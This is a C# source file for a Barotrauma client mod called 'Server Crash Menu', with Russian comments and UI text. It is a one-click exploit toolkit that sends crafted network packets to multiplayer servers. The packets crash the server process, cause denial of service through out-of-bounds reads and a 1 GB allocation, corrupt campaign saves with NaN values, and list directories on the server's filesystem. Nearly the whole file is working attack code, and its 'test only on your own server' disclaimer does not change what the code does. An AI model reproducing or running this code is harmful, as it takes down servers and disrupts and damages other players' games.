using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Reflection;
using Barotrauma;
using Barotrauma.Items.Components;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  SERVER CRASH MENU v3 (волна 596)
    //  • КНОПКА EXEC У КАЖДОГО метода (включая «ручные» — автоматизированы)
    //  • Entity-события идут ХИРУРГИЧЕСКИ: ID события берём из
    //    GameMain.Client.LastSentEntityEventID (публичное зеркало
    //    серверного счётчика, обновляется сервером сам)
    //  • DescriptionTag: кнопка СТАВИТ СВОЙСТВО локально — сеттер
    //    Item.DescriptionTag САМ отправляет ChangeProperty на сервер
    //    (пользователь подтверждил: сервер умирает мгновенно)
    //
    //  ПОЧЕМУ «EXEC НИЧЕГО НЕ ДЕЛАЕТ»: броски сервера глотаются
    //  catch-all'ом МОЛЧА (без вербоз-лога даже в консоль не пишутся).
    //  На СОЛО-сервере батч-дроп невидим (некому лагать). Эффект DoS
    //  виден на ЛЮДНОМ сервере = лаг/десинк у всех. Смерть процесса
    //  = только DescriptionTag и EventManager(с диалогом).
    // ============================================================
    public class ServerCrashMenuModule : CSModuleBase
    {
        public override string Id   => "crash_menu";
        public override string Name => "Crash Menu";
        public override string Description =>
            "Все краши/DoS из 596 волн. У КАЖДОГО есть EXEC.\n\n" +
            "• УБИВАЮТ ПРОЦЕСС: DescriptionTag (мгновенно),\n" +
            "  EventManager option=200 (циклом, нужен диалог)\n" +
            "• DoS = батч-дроп: СОЛО НЕВИДИМ, на людном = лаг всем\n" +
            "• Смотри результат в логе сервера (вербоз) или по реакции\n" +
            "• Тестируй ТОЛЬКО на своём сервере!";

        public override string Category => "exploit";

        private static readonly Color InstColor  = new Color(255, 90, 90);
        private static readonly Color LoopColor  = new Color(255, 150, 60);
        private static readonly Color DosColor   = new Color(255, 220, 90);
        private static readonly Color PermColor  = new Color(170, 150, 255);
        private static readonly Color SaveColor  = new Color(120, 220, 255);
        private static readonly Color OkColor    = new Color(120, 255, 140);
        private static readonly Color DangerColor= new Color(255, 110, 110);
        private static readonly Color RowColor   = new Color(30, 36, 48);
        private static readonly Color SelColor   = new Color(90, 40, 40);
        private static readonly Color AccentColor= new Color(255, 170, 90);
        private static readonly Color HeadColor  = new Color(45, 55, 75);

        private static GUIMessageBox _window;
        private static GUIListBox _list;
        private static GUITextBlock _desc;

        private class Method
        {
            public string Title;
            public string Desc;
            public Func<string> Exec;
        }

        private static readonly Method[] InstMethods = new Method[]
        {
            new Method
            {
                Title = "[INSTANT] DescriptionTag — СТАВИТ СВОЙСТВО САМ",
                Desc =
"★ ТВОЙ ПОДТВЕРЖДЁННЫЙ мгновенный краш.\n\n" +
"КАК: EXEC — модуль найдёт доступный предмет (в руках/\n" +
"инвентаре/рядом) и выставит DescriptionTag локально. СЕТТЕР\n" +
"САМ отправит ChangeProperty на сервер (ручной пакет не нужен!).\n\n" +
"НА СЕРВЕРЕ: сетитель зовёт TextManager.Get + рассылает —\n" +
"СЕРВЕР ПАДАЕТ СРАЗУ.\n\n" +
"УСЛОВИЕ: ты в раунде, есть хоть один доступный предмет.",
                Exec = ExecDescriptionTag
            },
            new Method
            {
                Title = "[CRASHLOOP] EventManager option=200",
                Desc =
"Смерть на СЛЕДУЮЩЕМ ТИКЕ. Работает ТОЛЬКО если активный\n" +
"событийный диалог (вопрос NPC с вариантами) таргетит ТЕБЯ.\n\n" +
"МЕХАНИКА: option=200 сохраняется в диалог → каждый кадр\n" +
"IsFinished кидает IndexOutOfRange → вокруг игрового цикла\n" +
"catch НЕТ → процесс падает.\n\n" +
"БЕЗ ДИАЛОГА: пакет просто игнорится (это норм).",
                Exec = ExecEventManager
            }
        };

        private static readonly Method[] DosMethods = new Method[]
        {
            new Method
            {
                Title = "[DOS] SoldItems: несуществующий префаб",
                Desc =
"ЛУЧШИЙ безправный DoS: throw на самом верху кампейн-чтения\n" +
"(до всех проверок).\n\n" +
"ЭФФЕКТ: батч-дроп. СОЛО невидим; спамь на ЛЮДНОМ = лаг всем.\n" +
"УСЛОВИЕ: кампания на сервере.",
                Exec = ExecSoldPrefab
            },
            new Method
            {
                Title = "[DOS] EntityState: new byte[1ГБ] (OOM)",
                Desc =
"msgLength=1ГБ в entity-событии → сервер делает new byte[1ГБ]\n" +
"ДО проверки буфера.\n\n" +
"ЭФФЕКТ: OOM-попытка/throw + батч-дроп. УСЛОВИЕ: в раунде.",
                Exec = ExecEntityStateOom
            },
            new Method
            {
                Title = "[DOS] Inventory: индексы start=0 end=255",
                Desc =
"Автоматизировано ХИРУРГИЧЕСКИ: event ID = серверный счётчик+1\n" +
"(публичное зеркало GameMain.Client.LastSentEntityEventID).\n\n" +
"Цель: ближайший контейнер. start=0/end=255 → запись за границу\n" +
"массива receivedItemIds → throw → батч-дроп. УСЛОВИЕ: в раунде\n" +
"и рядом есть контейнер (ящик/шкаф).",
                Exec = ExecInventoryOob
            },
            new Method
            {
                Title = "[DOS] SegmentTable: битый указатель",
                Desc =
"UPDATE_LOBBY + tablePointer=2ГБ → сервер читает таблицу\n" +
"сегментов за пределами буфера → throw. 4 байта.\n\n" +
"ЭФФЕКТ: батч-дроп. БЕЗ условий (даже из лобби).",
                Exec = ExecSegmentTable
            },
            new Method
            {
                Title = "[DOS] CircuitBox: левый opcode",
                Desc =
"Прямой CIRCUITBOX-пакет с Opcode=AddComponent — ваниль так\n" +
"не шлёт → switch бросит ArgumentOutOfRange.\n\n" +
"ЭФФЕКТ: батч-дроп. БЕЗ условий.",
                Exec = ExecCircuitBox
            },
            new Method
            {
                Title = "[DOS] Чат: несуществующий ордер",
                Desc =
"ORDER-чат с неизвестным id → throw на OrderPrefab.Prefabs[id]\n" +
"до спам/перм-чеков. (Ширины enum теперь считаются рантайм.)\n\n" +
"ЭФФЕКТ: батч-дроп. БЕЗ условий, работает ИЗ ЛОББИ.",
                Exec = ExecChatOrder
            },
            new Method
            {
                Title = "[DOS] CharacterInput: count=255",
                Desc =
"Инпут-пакет: 255 инпутов заявлено, данных нет → OOB-чтение.\n\n" +
"ЭФФЕКТ: батч-дроп. УСЛОВИЕ: в раунде с персонажем.",
                Exec = ExecCharInput
            },
            new Method
            {
                Title = "[DOS] VOIP: пустые буферы",
                Desc =
"8 буферов по 255 байт заявлено, данных 0 → BlockCopy за краем.\n\n" +
"ЭФФЕКТ: батч-дроп. УСЛОВИЕ: голос включён, не в муте.",
                Exec = ExecVoip
            },
            new Method
            {
                Title = "[DOS] Backup Indices: скан ФС сервера",
                Desc =
"REQUEST_BACKUP_INDICES с путём — сервер листает ЛЮБОЙ каталог\n" +
"без прав/лимитов. Ответ с метаданными приходит ТЕБЕ.\n\n" +
"ЭФФЕКТ: спам = IO-нагрузка + инфо-утечка (ответ виден в\n" +
"дампе). БЕЗ условий.",
                Exec = ExecBackupScan
            }
        };

        private static readonly Method[] SpecialMethods = new Method[]
        {
            new Method
            {
                Title = "[SAVE] CircuitBox: NaN в позицию узла",
                Desc =
"MoveComponent с MoveAmount=NaN: сохраняется в состоянии цепи\n" +
"и ПЕРСИСТИТСЯ В СЕЙВ кампании → глюки/краши после рестарта.\n\n" +
"EXEC: хирургический entity-пакет на ближайший circuit box.\n" +
"Персист сработает если ID узла угадан (берём первый известный\n" +
"клиенту). ★ ТОЛЬКО НА СВОЕЙ ТЕСТ-КАМПАНИИ!",
                Exec = ExecCircuitBoxNaN
            },
            new Method
            {
                Title = "[PERM-DOS] SelectMode: modeIndex 9999",
                Desc =
"SERVER_COMMAND(SelectMode) + u16 9999 → GameModes[9999] →\n" +
"IndexOutOfRange.\n\n" +
"НУЖЕН ПЕРМ SelectMode. Без перма сервер просто напишет\n" +
"«Permission denied» в свой лог (безвредно — кнопка для\n" +
"перми-серверов и своего).",
                Exec = ExecSelectMode
            },
            new Method
            {
                Title = "[WINDOW] LoadCampaign: мусорный файл",
                Desc =
"CAMPAIGN_SETUP_INFO(isNew=false) с путём C:\\garbage.save.\n" +
"В окне 586 (админ мёртв/лобби/permless/солo) сервер попробует\n" +
"грузить мусор → парс-исключения/фейл кампании.\n\n" +
"Без окна: сервер молча игнорит (безвредно).",
                Exec = ExecLoadGarbage
            }
        };

        public override string GetLabel() => "Crash Menu 💥";

        public override void OnClick()
        {
            if (_window != null) { CloseWindow(); return; }
            BuildWindow();
        }

        private static void BuildWindow()
        {
            try
            {
                _window = new GUIMessageBox("Server Crash Menu v3", "", Array.Empty<LocalizedString>(), new Vector2(0.8f, 0.92f));
                var content = _window.Content;
                content.ClearChildren();

                _list = new GUIListBox(new RectTransform(new Vector2(1f, 0.47f), content.RectTransform));
                _list.Color = new Color(20, 25, 35);

                AddGroupHeader("☠ УБИВАЮТ ПРОЦЕСС СЕРВЕРА", InstColor);
                AddMethods(InstMethods);
                AddGroupHeader("⚠ DoS — ЛАГ/ДЕСИНК (на соло невидим!)", DosColor);
                AddMethods(DosMethods);
                AddGroupHeader("🔧 ОСОБЫЕ", PermColor);
                AddMethods(SpecialMethods);

                _desc = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.43f), content.RectTransform, Anchor.BottomCenter)
                        { RelativeOffset = new Vector2(0f, 0.075f) },
                    "У КАЖДОГО метода есть EXEC. Клик по названию = описание.", textAlignment: Alignment.CenterLeft);
                _desc.TextColor = AccentColor;
                _desc.CanBeFocused = false;
                try { _desc.Wrap = true; } catch { }
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] GUI fail: " + e.Message, DangerColor);
                CloseWindow();
            }
        }

        private static void AddGroupHeader(string text, Color color)
        {
            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.07f), _list.Content.RectTransform), style: null);
            row.Color = HeadColor;
            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
                textAlignment: Alignment.CenterLeft);
            txt.TextColor = color;
            txt.CanBeFocused = false;
            AddSpacer();
        }

        private static void AddSpacer()
        {
            var gap = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.014f), _list.Content.RectTransform), style: null);
            gap.Color = new Color(15, 18, 26);
            gap.CanBeFocused = false;
        }

        private static void AddMethods(Method[] methods)
        {
            foreach (Method m in methods)
            {
                Method mm = m;
                var row = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.085f), _list.Content.RectTransform), style: null);
                row.Color = RowColor;
                var layout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.985f, 0.92f), row.RectTransform, Anchor.Center), isHorizontal: true);
                try { layout.RelativeSpacing = 0.008f; } catch { }

                var execBtn = new GUIButton(
                    new RectTransform(new Vector2(0.14f, 0.9f), layout.RectTransform), "EXEC ▶");
                execBtn.Color = SelColor;
                execBtn.OnClicked = (b, d) => { ShowDesc(mm); RunExec(mm); return true; };

                var nameBtn = new GUIButton(
                    new RectTransform(new Vector2(0.85f, 0.9f), layout.RectTransform),
                    mm.Title, textAlignment: Alignment.CenterLeft);
                nameBtn.OnClicked = (b, d) => { ShowDesc(mm); return true; };

                AddSpacer();
            }
        }

        private static void ShowDesc(Method m)
        {
            if (_desc == null) { return; }
            _desc.Text = m.Title + "\n──────────────────────────────\n" + m.Desc;
            _desc.TextColor = AccentColor;
        }

        private static void RunExec(Method m)
        {
            try
            {
                string result = m.Exec();
                GUI.AddMessage("[CrashMenu] " + result, OkColor);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] " + m.Title + ": " + e.Message, DangerColor);
            }
        }

        // ========================================================
        //  ХЕЛПЕРЫ
        // ========================================================
        private static bool CanSend() { return GameMain.Client?.ClientPeer != null; }
        private static bool InRound() { return GameMain.Client.GameStarted && Character.Controlled != null; }

        private static ushort NextEventId()
        {
            // Публичное зеркало серверного счётчика: сервер сам присылает его клиенту
            try { return (ushort)(GameMain.Client.LastSentEntityEventID + 1); }
            catch { return 0; }
        }

        private static Item FindAccessibleItem()
        {
            Character me = Character.Controlled;
            if (me == null) { return null; }
            try
            {
                foreach (Item it in me.HeldItems) { if (it != null && !it.Removed) { return it; } }
                if (me.Inventory != null)
                {
                    foreach (Item it in me.Inventory.AllItemsMod) { if (it != null && !it.Removed) { return it; } }
                }
            }
            catch { }
            Item best = null; float bestD = 300f;
            foreach (Item it in Item.ItemList)
            {
                if (it == null || it.Removed) { continue; }
                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                if (d < bestD) { bestD = d; best = it; }
            }
            return best;
        }

        private static Item FindContainer()
        {
            Character me = Character.Controlled;
            if (me == null) { return null; }
            Item best = null; float bestD = 400f;
            foreach (Item it in Item.ItemList)
            {
                if (it == null || it.Removed) { continue; }
                bool isContainer = false;
                try { isContainer = it.GetComponent<ItemContainer>() != null; } catch { }
                if (!isContainer) { continue; }
                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                if (d < bestD) { bestD = d; best = it; }
            }
            return best;
        }

        private static Item FindCircuitBox()
        {
            Character me = Character.Controlled;
            if (me == null) { return null; }
            Item best = null; float bestD = 500f;
            foreach (Item it in Item.ItemList)
            {
                if (it == null || it.Removed) { continue; }
                bool isCb = false;
                try { isCb = it.GetComponent<CircuitBox>() != null; } catch { }
                if (!isCb) { continue; }
                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                if (d < bestD) { bestD = d; best = it; }
            }
            return best;
        }

        // Хирургический entity-пакет: event ID = серверный счётчик+1
        private static string SendEntityEventRaw(ushort entityId, IWriteMessage payload)
        {
            IWriteMessage body = new WriteOnlyMessage();
            body.WriteUInt16(0);                                   // characterStateID=0 → парсить сразу
            body.WriteBytes(payload.Buffer, 0, payload.LengthBytes);

            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                msg.WritePadBits();
                msg.WriteUInt16(NextEventId());
                msg.WriteByte(1);
                msg.WriteUInt16(entityId);
                msg.WriteVariableUInt32((uint)body.LengthBytes);
                msg.WriteBytes(body.Buffer, 0, body.LengthBytes);
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "ок (entity " + entityId + ")";
        }

        // ========================================================
        //  [INSTANT] DescriptionTag
        // ========================================================
        private static string ExecDescriptionTag()
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item target = FindAccessibleItem();
            if (target == null) { return "доступный предмет не найден"; }
            try
            {
                // Сеттер САМ шлёт ChangeProperty на сервер — сервер падает
                target.DescriptionTag = "zzz_crash_tag_test";
                return "DescriptionTag выставлен на «" + target.Name + "» (ID " + target.ID +
                       "). Сеттер отправил событие — сервер должен умереть СРАЗУ.";
            }
            catch (Exception e)
            {
                return "setter fail: " + e.Message;
            }
        }

        // ========================================================
        //  [CRASHLOOP] EVENTMANAGER
        // ========================================================
        private static string ExecEventManager()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.EVENTMANAGER_RESPONSE);
            msg.WriteUInt16(0x7FFF);
            msg.WriteByte(200);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "EVENTMANAGER отправлен (сработает только при активном диалоге на тебя)";
        }

        // ========================================================
        //  [DOS] SoldItems unknown prefab
        // ========================================================
        private static string ExecSoldPrefab()
        {
            if (!CanSend()) { return "нет подключения"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
            msg.WriteUInt16((ushort)ClientPermissions.ManageCampaign);
            ushort loc = CurrentLocIndex();
            msg.WriteUInt16(loc);
            msg.WriteUInt16(loc);
            msg.WriteByte(0);
            msg.WriteBoolean(false);
            msg.WriteBoolean(false);
            msg.WriteBoolean(false);
            msg.WriteByte(0);
            msg.WriteByte(0);
            msg.WriteByte(0);
            msg.WriteByte(1);
            msg.WriteIdentifier("a".ToIdentifier());
            msg.WriteUInt16(1);
            msg.WriteIdentifier("zzz_nonexistent_prefab".ToIdentifier());
            msg.WriteUInt16(0);
            msg.WriteBoolean(false);
            msg.WriteByte(0);
            msg.WriteByte(0);
            msg.WriteUInt16(0);
            msg.WriteUInt16(0);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "SoldItems-бомба ушла";
        }

        // ========================================================
        //  [DOS] EntityState OOM
        // ========================================================
        private static string ExecEntityStateOom()
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            ushort myId = Character.Controlled.ID;

            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                msg.WritePadBits();
                msg.WriteUInt16(NextEventId());
                msg.WriteByte(1);
                msg.WriteUInt16(myId);
                msg.WriteVariableUInt32(0x40000000u);
                msg.WriteUInt16(0);
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "OOM-бомба ушла (new byte[1ГБ] на сервере)";
        }

        // ========================================================
        //  [DOS] Inventory start=0 end=255 (хирургический)
        // ========================================================
        private static string ExecInventoryOob()
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item container = FindContainer();
            if (container == null) { return "рядом нет контейнера (ящик/шкаф)"; }

            IWriteMessage payload = new WriteOnlyMessage();
            payload.WriteRangedInteger(1, 0, 12);                       // EventType.InventoryState
            int comps = 1;
            try { comps = Math.Max(1, container.Components.Count); } catch { }
            payload.WriteRangedInteger(0, 0, comps - 1);                // containerIndex
            payload.WriteByte(0);                                       // start
            payload.WriteByte(255);                                     // end → за capacity
            for (int i = 0; i < 96; i++) { payload.WriteByte(0); }      // 6-битные itemCount=0

            SendEntityEventRaw(container.ID, payload);
            return "Inventory-бомба ушла на «" + container.Name + "» (start=0 end=255 → запись за границу)";
        }

        // ========================================================
        //  [DOS] SegmentTable
        // ========================================================
        private static string ExecSegmentTable()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
            msg.WriteInt32(int.MaxValue);
            msg.WriteUInt16(0);
            msg.WriteUInt16(0);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "SegmentTable-бомба ушла";
        }

        // ========================================================
        //  [DOS] CircuitBox bad opcode
        // ========================================================
        private static string ExecCircuitBox()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.CIRCUITBOX);
            INetSerializableStruct header = new NetCircuitBoxHeader((CircuitBoxOpcode)2, 1, 0);
            header.Write(msg);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "CircuitBox opcode-бомба ушла";
        }

        // ========================================================
        //  [DOS] Chat unknown order (enum widths runtime)
        // ========================================================
        private static string ExecChatOrder()
        {
            if (!CanSend()) { return "нет подключения"; }
            int typeMax = Enum.GetValues(typeof(ChatMessageType)).Length - 1;
            int modeMax = Enum.GetValues(typeof(ChatMode)).Length - 1;
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.ChatMessage);
                msg.WriteUInt16(1);
                msg.WriteRangedInteger((int)ChatMessageType.Order, 0, typeMax);
                msg.WriteRangedInteger((int)ChatMode.None, 0, modeMax);
                msg.WriteIdentifier("zzz_nonexistent_order".ToIdentifier());
                msg.WriteUInt16(0);
                msg.WriteUInt16(0);
                msg.WriteByte(0);
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "ORDER-бомба ушла (из лобби тоже)";
        }

        // ========================================================
        //  [DOS] CharacterInput count=255
        // ========================================================
        private static string ExecCharInput()
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.CharacterInput);
                msg.WriteUInt16(1);
                msg.WriteByte(255);
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "Input-бомба ушла";
        }

        // ========================================================
        //  [DOS] VOIP
        // ========================================================
        private static string ExecVoip()
        {
            if (!CanSend()) { return "нет подключения"; }
            byte mySession = 0;
            try { mySession = GameMain.Client.SessionId; } catch { }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.VOICE);
            msg.WriteByte(mySession);
            for (int i = 0; i < 8; i++) { msg.WriteByte(255); }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Unreliable);
            return "VOIP-бомба ушла";
        }

        // ========================================================
        //  [DOS] Backup scan
        // ========================================================
        private static string ExecBackupScan()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.REQUEST_BACKUP_INDICES);
            msg.WriteString("C:\\Windows");
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "Скан ФС отправлен (C:\\Windows) — сервер листает каталог и шлёт метаданные тебе";
        }

        // ========================================================
        //  [SAVE] CircuitBox NaN
        // ========================================================
        private static string ExecCircuitBoxNaN()
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item cbItem = FindCircuitBox();
            if (cbItem == null) { return "рядом нет circuit box"; }

            int cbIndex = 0;
            ushort nodeId = 1;
            try
            {
                for (int i = 0; i < cbItem.Components.Count; i++)
                {
                    if (cbItem.Components[i] is CircuitBox) { cbIndex = i; break; }
                }
                // достаём первый известный клиенту ID узла через reflection
                var cb = cbItem.GetComponent<CircuitBox>();
                var compsProp = typeof(CircuitBox).GetProperty("Components",
                    BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
                if (compsProp != null)
                {
                    var list = compsProp.GetValue(cb) as IEnumerable<object>;
                    if (list != null)
                    {
                        foreach (var node in list)
                        {
                            var idProp = node.GetType().GetProperty("ID",
                                BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
                            if (idProp != null)
                            {
                                object v = idProp.GetValue(node);
                                if (v is ushort u && u != 0) { nodeId = u; break; }
                            }
                        }
                    }
                }
            }
            catch { }

            IWriteMessage payload = new WriteOnlyMessage();
            payload.WriteRangedInteger(0, 0, 12);                       // EventType.ComponentState
            int comps = 1;
            try { comps = Math.Max(1, cbItem.Components.Count); } catch { }
            payload.WriteRangedInteger(cbIndex, 0, comps - 1);
            payload.WriteByte((byte)CircuitBoxOpcode.MoveComponent);    // = 3
            CircuitBoxMoveComponentEvent move = new CircuitBoxMoveComponentEvent(
                ImmutableArray.Create<ushort>(nodeId),
                ImmutableArray.Create<CircuitBoxInputOutputNode.Type>(),
                ImmutableArray.Create<ushort>(nodeId),
                new Vector2(float.NaN, float.NaN));
            ((INetSerializableStruct)move).Write(payload);

            SendEntityEventRaw(cbItem.ID, payload);
            return "NaN-бомба ушла в «" + cbItem.Name + "» (узел " + nodeId + "). ★ Сейв может испортиться!";
        }

        // ========================================================
        //  [PERM-DOS] SelectMode 9999
        // ========================================================
        private static string ExecSelectMode()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
            msg.WriteUInt16((ushort)ClientPermissions.SelectMode);
            msg.WriteUInt16(9999);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "SelectMode-бомба ушла (сработает при перме SelectMode, иначе — отказ в логе)";
        }

        // ========================================================
        //  [WINDOW] LoadCampaign мусорный файл
        // ========================================================
        private static string ExecLoadGarbage()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.CAMPAIGN_SETUP_INFO);
            msg.WriteBoolean(false);                       // isNew = false (загрузка)
            msg.WritePadBits();
            msg.WriteString("C:\\zzz_garbage_nonexistent.save");
            msg.WriteBoolean(false);
            msg.WritePadBits();
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "LoadCampaign-бомба ушла (сработает в окне 586/соло, иначе сервер молчит)";
        }

        private static ushort CurrentLocIndex()
        {
            try
            {
                var map = GameMain.GameSession?.Campaign?.Map;
                if (map?.CurrentLocation != null)
                {
                    int idx = map.Locations.IndexOf(map.CurrentLocation);
                    if (idx >= 0) { return (ushort)idx; }
                }
            }
            catch { }
            return 0;
        }

        private static void CloseWindow()
        {
            try { _window?.Close(); } catch { }
            _window = null;
            _list = null;
            _desc = null;
        }

        public override void Dispose()
        {
            CloseWindow();
            base.Dispose();
        }
    }
}
